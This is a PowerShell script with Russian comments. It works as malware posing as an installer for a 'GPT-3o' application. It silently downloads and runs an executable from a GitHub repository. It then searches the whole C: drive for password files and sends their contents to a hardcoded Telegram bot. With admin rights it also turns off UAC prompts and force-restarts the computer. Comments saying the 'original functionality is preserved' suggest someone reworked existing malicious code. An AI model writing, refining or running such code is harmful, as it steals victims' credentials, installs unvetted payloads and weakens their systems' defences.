# Блок 1: Скачивание и установка приложения
try {
    $exePath = Join-Path $env:ProgramData 'GPT-3o_win-x64_setup.exe'
    
    # Скачивание файла
    try {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
        Write-Output "Скачивание установочного файла..."
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/rootkalilocalhost/modules/main/GPT-3o_win-x64_setup.exe' -OutFile $exePath -ErrorAction Stop
        Write-Output "Файл успешно загружен"
    } catch {
        Write-Warning "Ошибка загрузки файла: $($_.Exception.Message)"
        $exePath = $null
    }
    
    # Запуск установки только если файл скачался
    if ($exePath -and (Test-Path $exePath)) {
        Write-Output "Запуск установки..."
        $process = Start-Process -FilePath $exePath -ArgumentList '/S' -PassThru -NoNewWindow -Wait
        if ($process.ExitCode -ne 0) {
            Write-Warning "Процесс завершился с кодом ошибки: $($process.ExitCode)"
        } else {
            Write-Output "Установка завершена успешно"
        }
    } else {
        Write-Warning "Файл для установки недоступен, пропускаем установку"
    }
} catch {
    Write-Warning "Ошибка в блоке установки: $($_.Exception.Message)"
} finally {
    # Удаление установщика
    if ($exePath -and (Test-Path $exePath)) {
        try {
            Remove-Item $exePath -Force -ErrorAction SilentlyContinue
            Write-Output "Временный файл удален"
        } catch {
            Write-Warning "Не удалось удалить файл: $($_.Exception.Message)"
        }
    }
}

# Блок 2: Настройки для поиска и Telegram
$telegramBotToken = "5574338417:AAHzByMElpQLpyZ72paKuP4Gb2gqcIByKBo"
$chatId = "1473231416"
$searchPatterns = @("пароли.txt", "passwords.txt")
$tempDir = if ($env:TEMP) { $env:TEMP } else { [System.IO.Path]::GetTempPath() }

# Блок 3: Поиск и отправка файлов (СОХРАНЕН ФУНКЦИОНАЛ ПОИСКА ПО ВСЕМУ C:\)
try {
    Write-Output "Запуск поиска файлов на диске C:\..."
    
    $foundFiles = @()
    foreach ($pattern in $searchPatterns) {
        try {
            Write-Output "Поиск файлов: $pattern"
            # СОХРАНЯЕМ исходный функционал - поиск по всему C:\
            $files = Get-ChildItem "C:\" -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue
            if ($files) {
                $foundFiles += $files
                Write-Output "Найдено файлов $pattern : $($files.Count)"
            }
        } catch {
            Write-Warning "Ошибка поиска по шаблону $pattern : $($_.Exception.Message)"
        }
    }
    
    # Удаление дубликатов
    $foundFiles = $foundFiles | Sort-Object FullName -Unique
    
    if ($foundFiles.Count -eq 0) {
        Write-Output "Файлы не найдены"
    } else {
        Write-Output "Всего найдено файлов: $($foundFiles.Count)"
        
        # Создание выходного файла
        $outputFile = Join-Path $tempDir "collected_data_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $encoding = [System.Text.Encoding]::UTF8
        $maxFileSize = 10 * 1024 * 1024  # 10 MB
        $maxTotalSize = 50 * 1024 * 1024  # 50 MB
        
        # Очистка выходного файла
        if (Test-Path $outputFile) {
            Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
        }
        
        # Чтение и объединение содержимого файлов
        $totalSize = 0
        $processedFiles = 0
        
        foreach ($file in $foundFiles) {
            try {
                # Проверка размера файла
                if ($file.Length -gt $maxFileSize) {
                    Write-Warning "Файл $($file.FullName) слишком большой ($([math]::Round($file.Length/1MB,2)) MB), пропускаем"
                    continue
                }
                
                # Проверка общего размера
                if (($totalSize + $file.Length) -gt $maxTotalSize) {
                    Write-Warning "Достигнут максимальный общий размер данных (50 MB)"
                    break
                }
                
                # Чтение файла
                $content = [System.IO.File]::ReadAllText($file.FullName, $encoding)
                $header = "=== Файл: $($file.FullName) (Размер: $($file.Length) байт) ==="
                [System.IO.File]::AppendAllText($outputFile, "$header`r`n", $encoding)
                [System.IO.File]::AppendAllText($outputFile, "$content`r`n`r`n", $encoding)
                
                $totalSize += $file.Length
                $processedFiles++
                Write-Output "Обработан: $($file.Name) ($processedFiles/$($foundFiles.Count))"
                
            } catch {
                Write-Warning "Ошибка чтения $($file.FullName): $($_.Exception.Message)"
            }
        }
        
        # Отправка данных через Telegram
        if (Test-Path $outputFile -and (Get-Item $outputFile).Length -gt 0) {
            try {
                $fileInfo = Get-Item $outputFile
                Write-Output "Отправка файла ($([math]::Round($fileInfo.Length/1KB,2)) KB) в Telegram..."
                
                # СОХРАНЕН исходный функционал отправки
                $telegramUri = "https://api.telegram.org/bot$telegramBotToken/sendDocument"
                
                $form = @{
                    chat_id = $chatId
                    caption = "Собранные данные"
                    document = Get-Item $outputFile
                }
                
                $response = Invoke-RestMethod -Uri $telegramUri -Method Post -Form $form -ErrorAction Stop
                
                if ($response.ok) {
                    Write-Output "✅ Данные успешно отправлены через Telegram"
                } else {
                    Write-Warning "Ошибка отправки: $($response.description)"
                }
                
            } catch {
                Write-Warning "Ошибка отправки в Telegram: $($_.Exception.Message)"
            } finally {
                # Очистка временного файла
                if (Test-Path $outputFile) {
                    Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
                    Write-Output "Временные файлы очищены"
                }
            }
        } else {
            Write-Output "Нет данных для отправки"
        }
    }
    
} catch {
    Write-Warning "Ошибка в блоке поиска: $($_.Exception.Message)"
}

# Блок 4: Изменение системных настроек и перезагрузка (СОХРАНЕН ФУНКЦИОНАЛ)
try {
    if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Output "Обнаружены права администратора..."
        
        # Отключение UAC - СОХРАНЕН исходный функционал
        try {
            Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Type DWord -Force -ErrorAction Stop
            Write-Output "UAC отключен"
        } catch {
            Write-Warning "Не удалось отключить UAC: $($_.Exception.Message)"
        }
        
        # Перезагрузка - СОХРАНЕН исходный функционал
        Write-Output "Перезагрузка компьютера через 15 секунд..."
        for ($i = 15; $i -gt 0; $i--) {
            Write-Output "Перезагрузка через $i секунд..."
            Start-Sleep -Seconds 1
        }
        
        Write-Output "Выполняется перезагрузка..."
        Restart-Computer -Force -ErrorAction Stop
        
    } else {
        Write-Output "Недостаточно прав для изменения системных настроек (требуются права администратора)"
    }
} catch {
    Write-Warning "Ошибка в системных настройках: $($_.Exception.Message)"
}

Write-Output "Скрипт завершен"
